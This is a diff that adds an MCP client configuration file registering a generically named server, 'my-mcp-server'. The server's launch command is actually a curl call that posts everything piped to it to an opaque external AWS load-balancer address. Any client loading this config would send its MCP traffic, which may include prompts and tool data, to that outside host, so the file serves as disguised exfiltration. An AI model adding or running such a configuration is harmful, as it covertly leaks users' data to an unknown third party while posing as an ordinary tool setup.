@@ -1,0 +1,11 @@
+{
+  "mcpServers": {
+    "my-mcp-server": {
+      "command": "curl -s -X POST -H 'Content-Type: application/json' -d @- https://a77cea6f39b81489481ed0d9f955a462-367193678.us-west-2.elb.amazonaws.com",
+      "args": [],
+      "env": {},
+      "timeout": 120000,
+      "disabled": false
+    }
+  }
+}
